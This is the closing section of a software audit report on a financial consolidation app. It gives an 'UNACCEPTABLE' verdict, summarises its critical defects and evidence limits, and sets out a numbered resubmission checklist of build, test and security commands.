- **Downgraded on insufficient evidence:** I attempted to demonstrate hash collisions and second-preimages against `simpleHash` across 5M, 3M, and 20M candidate searches. **None succeeded.** I therefore removed all collision claims and rest F-0015 solely on two proven structural defects — the hash covers different `uid()`/`now()` values than the stored record, and there is no chain. Both are verifiable by reading the code.
- **Not claimed:** E2E, coverage percentages, and `tauri:build` results. Playwright browser download and the Rust toolchain were unavailable in this sandbox. These are recorded as explicit coverage gaps, not inferred outcomes. I did not substitute documentation for execution.
- **Credit where earned:** the build genuinely passes, the bundle budget genuinely passes, the engines shard is genuinely 4,096/4,100, the Monte Carlo PRNG is genuinely seeded, the plugin AST validator is genuine work, the NetSuite OAuth1.0a analysis is domain-correct, and AG Grid licensing is compliant. Suppressing these would have made the report less accurate, not more rigorous.
- **Severity consistency:** every CRITICAL is tied to a reproduced execution result, an extracted bundle string, or a failing test I ran. No CRITICAL rests on inference alone.

Unresolved items blocking PASS: full-suite pass rate (suite hangs), coverage (unobtainable), E2E (not run), Tauri build (not run), pre-squash secret history (destroyed).

---

## VERDICT

# UNACCEPTABLE

Fourteen confirmed CRITICAL defects. The shipped production bundle throws a `ReferenceError` on every authenticated route. TypeScript fails, ESLint fails, the test suite cannot terminate, 316 tests fail across the shards that did run, and one shard timed out entirely. The encryption key is printed in a public JS asset. A missing FX rate silently zeroes a subsidiary. Consolidation reports errors as balanced zeros. The GL validator does not check that debits equal credits. Backup and restore are unproven because every backup test times out. All local quality gates are structurally incapable of executing.

Twenty of thirty-five documented claims are refuted, including "Production-Ready," "100% decimal.js," "End-to-end encryption," "WCAG 2.2 AA," and five Web Workers that do not exist.

Against the founder's stated goal — replace every competing tool with zero compromises — this build does not replace Excel, because it does not load. It does not replace manual spreadsheet consolidation, because it is currently more dangerous than manual consolidation: a spreadsheet does not silently delete a subsidiary and then report itself balanced.

There is real engineering here. The consolidation engine's ASC 810 structure, the seeded Monte Carlo PRNG, the acorn-based plugin validator, the NetSuite OAuth1.0a implementation, and the disciplined bundle budget are genuine. That work is buried under a governance apparatus of 407 markdown files, nine agent personas, and eighteen numbered "gates" that cannot run — process ceremony substituted for verification. The single-line fix for the crash that breaks the entire product is one missing import, and no gate caught it because no gate was executable.

**Do not ship. Do not demo to a finance team. Do not represent this as production-ready.**

---

## RESUBMISSION GATE

Re-audit permitted only when **all** of the following are demonstrated with command output:

1. `npx tsc --noEmit` → exit 0.
2. `npx eslint src --max-warnings 0` → exit 0.
3. `vitest run` **terminates** and reports ≥95% pass with zero timeouts.
4. `vitest run --coverage` produces a report meeting a stated, honest threshold.
5. All 14 CRITICAL findings fixed with the specified regression tests passing.
6. Known-answer vectors 1-10 implemented and green.
7. Backup → wipe → restore → deep-equal proof, executed and logged.
8. Husky hooks executable and demonstrably blocking a deliberately broken commit.
9. `npm audit --omit=dev` → zero HIGH/CRITICAL.
10. `npm run tauri:build` succeeds; `shell:allow-execute` removed; updater endpoint valid or disabled.
11. E2E: import GL → budget → forecast → report → export → persist → restore, green.
12. README reconciled to measured reality; every refuted claim removed or corrected.
13. All P0 competitive gaps resolved or explicitly accepted in writing by the founder with a signed risk acknowledgment.

**Re-audit required: YES. Verdict stands until every item above is evidenced.**

---

**END_OF_AUDIT**

*Audit performed against commit `38e7f0f` on 2026-07-28. All findings are reproducible from the command evidence and file:line references cited. No file in the repository was modified by this audit.*
